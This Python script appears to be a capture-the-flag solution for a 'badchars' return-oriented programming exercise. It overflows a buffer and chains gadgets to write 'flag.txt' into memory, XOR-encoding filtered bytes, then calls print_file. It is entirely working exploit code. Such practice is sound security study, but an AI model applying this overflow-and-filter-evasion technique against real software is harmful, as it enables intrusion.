#!/usr/bin/python3

import sys

POP_R12_R13_R14_R15 = 0x40069c
POP_RDI = 0x4006a3
MOV_PTR_R13_R12 = 0x400634
XOR_PTR_R15_R14B = 0x400628
CALL_PRINT_FILE = 0x400620

BSS_ADDR = 0x601038

FILENAME = b"flag.txt"
FLIP_BYTE = 12 # arbitrary uint8

def write_ints(dat):
    for v in dat:
        sys.stdout.buffer.write(v.to_bytes(8, byteorder="little"))

def write_call(addr):
    write_ints([addr])

def write_offset():
    sys.stdout.buffer.write(b'A'*40)

def write_to_addr_xor(val, val_xor, dest_addr):
    write_call(POP_R12_R13_R14_R15)
    write_ints([val, dest_addr, val_xor, dest_addr])
    write_call(MOV_PTR_R13_R12)
    write_call(XOR_PTR_R15_R14B)

def write_to_addr_nobad(val, dest_addr):
    if val in b'xga.':
        write_to_addr_xor(val ^ FLIP_BYTE, FLIP_BYTE, dest_addr)
    else:
        write_to_addr_xor(val, 0, dest_addr)

def write_str_to_addr(s, dest):
    offset = 0
    for c in s:
        write_to_addr_nobad(c, dest + offset)
        offset = offset + 1

write_offset()
write_str_to_addr(FILENAME, BSS_ADDR)

write_call(POP_RDI)
write_ints([BSS_ADDR])
write_call(CALL_PRINT_FILE)
